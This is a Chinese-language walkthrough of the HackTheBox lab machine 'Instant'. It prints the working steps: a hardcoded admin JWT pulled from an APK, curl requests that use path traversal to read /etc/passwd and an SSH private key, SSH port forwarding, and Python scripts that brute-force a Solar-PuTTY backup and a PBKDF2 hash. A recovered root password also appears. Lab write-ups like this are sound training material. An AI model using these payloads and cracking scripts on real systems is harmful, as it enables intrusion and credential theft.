# Linux渗透实战之Instant-先知社区

> **来源**: https://xz.aliyun.com/news/16326  
> **文章ID**: 16326

---

![](images/20241223191645-64e7cbca-c11f-1.png)  
靶机链接：<https://app.hackthebox.com/machines/Instant>

## 知识总结

```
目录&子域名爆破
利用apktool解剖apk文件
token泄露&目录遍历&ssh私钥读取
文本处理神器awk的使用
Solar-PuTTY&Decrypt
pbkdf2_sha256_brute
```

## 信息收集

### 端口探测

```
nmap -sT --min-rate 10000 -p- 10.10.11.37
......................
Host is up (0.075s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
9481/tcp  filtered unknown
27672/tcp filtered unknown
29478/tcp filtered unknown
32707/tcp filtered unknown
33095/tcp filtered unknown
33239/tcp filtered unknown
33413/tcp filtered unknown
51243/tcp filtered unknown
54949/tcp filtered unknown
60951/tcp filtered unknown
63628/tcp filtered unknown
```

详细扫描

```
nmap -sTVC -O -p22,80 10.10.11.37
.........................
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

直接访问80看看都有什么

### 服务枚举

![](images/20241223192222-2da04d44-c120-1.png)  
发现一个Download，下载得到一个instant.apk，猜测里面会有想要的东西  
先老一套目录&子域名爆破组合拳看看有没有遗漏的信息

#### 目录&子域名爆破

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://instant.htb/
.................
ffuf -c -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u 'http://instant.htb' -H "Host:FUZZ.instant.htb"
```

很不幸，啥也没发现，那就来解剖一下这个apk文件

## 解剖APK

<https://www.kali.org/tools/apktool/>  
我们来利用kali自带的工具来解析一下这个东西

![](images/20241223192307-489e5726-c120-1.png)

![](images/20241223192352-63607030-c120-1.png)

```
apktool d instant.apk
```

![](images/20241223192420-73fc169c-c120-1.png)  
信息很多，我们可以用grep过滤关键词便于快速获得想要的信息

```
grep -R -i instant.htb ./
```

![](images/20241223192441-80833814-c120-1.png)  
找到了两个子域名及一个用户support

```
support@instant.htb
mywalletv1.instant.htb
swagger-ui.instant.htb
```

![](images/20241223192502-8d695acc-c120-1.png)

![](images/20241223192517-96704e3c-c120-1.png)  
感觉突破口在这里

![](images/20241223192534-a02b33ec-c120-1.png)  
这里让我们填token，但我们没有，看了看下面的功能，有注册和登录用户的功能以及读日志，先注册一个用户看看

![](images/20241223192723-e158b5f6-c120-1.png)  
这里要注意一下Pin

![](images/20241223192755-f4412522-c120-1.png)

```
curl -X POST "http://swagger-ui.instant.htb/api/v1/register" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"email\": \"string@qq.com\",  \"password\": \"redteam\",  \"pin\": \"12345\",  \"username\": \"redteam\"}"
```

注册之后，登录看看

```
curl -X POST "http://swagger-ui.instant.htb/api/v1/login" -H  "accept: application/json" -H  "Content-Type: application/json" -d "{  \"password\": \"redteam\",  \"username\": \"redteam\"}"
```

![](images/20241223192818-02580af4-c121-1.png)  
获得token

![](images/20241223192838-0e2ea6a8-c121-1.png)  
我们把这段token输入在上面的认证里面，使用读日志的功能看看是否能读出敏感信息

![](images/20241223192902-1c87991c-c121-1.png)  
认证失败，权限不够，再探apk文件看看验证逻辑

## 再探APK

直接grep过滤token发现有好多文件，想起验证token的那个界面，尝试过滤authorizations

![](images/20241223192948-378495f8-c121-1.png)  
这样文件少了很多，同时也发现了敏感词汇Admin  
在这两个文件中都发现了token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

![](images/20241223193112-6a04ec8a-c121-1.png)

![](images/20241223193123-703a6300-c121-1.png)  
这样权限应该是够了，我们将这段token输入认证的界面，然后再去读一下/etc/passwd

```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

![](images/20241223193148-7f0fe120-c121-1.png)  
利用成功！发现了一个用户shirohige

## 建立立足点

![](images/20241223193208-8b5d0cd2-c121-1.png)  
找到了版本，想着找找可利用的或者敏感文件，但这个项目只是一个适用于 Flask API 的 Easy OpenAPI 规范和 Swagger UI  
前面既然找到了shirohige，试着读一下ssh私钥吧

```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fshirohige%2F.ssh%2Fid_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"
```

![](images/20241223193244-a05f53b0-c121-1.png)  
格式不对，需要调整调整

### awk的妙用

处理文本，当然要用我们的文本神器awk啦

![](images/20241223193416-d772ba72-c121-1.png)

```
cat sou | awk -F'\"' '{print $2}'
```

双引号很好去掉，但结尾还有个\n，想着把这个当分隔符，但效果不尽人意，思路发散一下，以\分界不就好了最终payload

```
cat sou | awk -F'\"' '{print $2}' | awk -F '\' '{print $1}'
```

![](images/20241223193510-f7aa6c90-c121-1.png)

```
ssh shirohige@10.10.11.37 -i id_rsa
```

![](images/20241223193533-052c994c-c122-1.png)

## 权限提升

### ssh端口转发

![](images/20241223193601-16101374-c122-1.png)  
发现有两个端口8888和8808转发出来看看

```
ssh shirohige@10.10.11.37 -i id_rsa -L 8888:127.0.0.1:8888
ssh shirohige@10.10.11.37 -i id_rsa -L 8808:127.0.0.1:8808
```

![](images/20241223193619-20d4becc-c122-1.png)

![](images/20241223193632-28d434ea-c122-1.png)

### 备份文件&Solar-PuTTY&Decrypt

```
find / -name '*backup*' 2>/dev/null
```

![](images/20241223193649-32e4a7a8-c122-1.png)  
找到可疑文件,在Google上搜了一下

![](images/20241223193705-3bf1df46-c122-1.png)  
<https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5>

```
import base64
import sys
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2

def decrypt(passphrase, ciphertext):
    data = ''
    try:
        # Decode the base64 encoded ciphertext
        array = base64.b64decode(ciphertext)
        salt = array[:24]
        iv = array[24:32]
        encrypted_data = array[48:]

        # Derive the key using PBKDF2
        key = PBKDF2(passphrase, salt, dkLen=24, count=1000)

        # Create the Triple DES cipher in CBC mode
        cipher = DES3.new(key, DES3.MODE_CBC, iv)

        # Decrypt the data
        decrypted_data = cipher.decrypt(encrypted_data)

        # Remove padding (PKCS7 padding)
        padding_len = decrypted_data[-1]
        decrypted_data = decrypted_data[:-padding_len]

        data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

    except Exception as e:
        print(f'Error: {e}')

    return data

if len(sys.argv) < 3:
    print(f'Usage: {sys.argv[0]} putty_session.dat wordlist.txt')
    exit(1)

with open(sys.argv[1]) as f:
    cipher = f.read()

with open(sys.argv[2]) as passwords:
    for i, password in enumerate(passwords):
        password = password.strip()
        decrypted = decrypt(password, cipher)
        print(f'[{i}] {password=}', end='\r')
        if 'Credentials' in decrypted:
            print(f'\r[{i}] {password=} {" " * 10}')
            print()
            print(decrypted)
            break

```

```
python3 exp.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
```

![](images/20241223194043-be4c6592-c122-1.png)

```
"Username":"root","Password":"12**24nzC!r0c%q12"
```

![](images/20241223194059-c7e4f2f4-c122-1.png)

### linpeas.sh&数据库泄露&pbkdf2\_sha256\_brute

我将linpeas.sh放到tmp目录下执行，发现了这个东西

![](images/20241223194121-d4de2412-c122-1.png)

```
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cb
b6586fab7ab7bc762bd978
```

附上butre脚本

```
import hashlib
import binascii
import base64

def pbkdf2_hash(password, salt, iterations=600000, dklen=32):  # dklen 默认为哈希值长度
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',  # 使用 SHA-256 算法
        password.encode('utf-8'),
        salt,
        iterations,
        dklen
    )
    return hash_value

def find_matching_password(dictionary_file, target_hash, salt, iterations=600000, dklen=32):
    # 将目标哈希值从十六进制字符串转换为字节串
    target_hash_bytes = binascii.unhexlify(target_hash)
    with open(dictionary_file, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()  # 去除每行密码的空格或换行符
            hash_value = pbkdf2_hash(password, salt, iterations, dklen)
            if hash_value == target_hash_bytes:
                print(f"Found password: {password}")
                return password
    print("Password not found.")
    return None

# 解析输入数据
salt = base64.b64decode('I5bFyb0ZzD69pNX8')  # 解码 Base64 盐值
target_hash = 'e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978'
dictionary_file = '/usr/share/wordlists/rockyou.txt'  # 字典文件路径

# 调用破解函数
find_matching_password(dictionary_file, target_hash, salt)

```

能不能爆出来就不知道啦，我爆了好久也没结果，不过rockyou.txt字典里面没有`12**24nzC!r0c%q12`  
我把这个单独放在一个单独字典里面，也爆不出来，这个应该不是root的密码，可能是admin的密码吧

## 总结

组合拳目录子域名爆破并没找到突破点，反而是在apk中发现了两个子域名，其中一个找到了突破口，通过注册一个用户登录后发现了token，并且在apk文件中找到了admin的token，通过认证后利用读取日志的功能目录遍历到/etc/passwd知道了shirohig这个用户，然后读取了ssh私钥成功建立立足点。  
看到本地有8888和8808端口，但不是突破点，在使用find查找备份文件中找到了突破口，Solar-PuTTY\_Decrypt获得了root密码，也在数据库发现了pbkdf2\_sha256加密，在最后给了一个brute的脚本，但我也没爆出来，嘻嘻。比较难想的是利用apk撕口子，面对众多的文件一时手足无措。总的来说这台靶机还不错，中规中规。
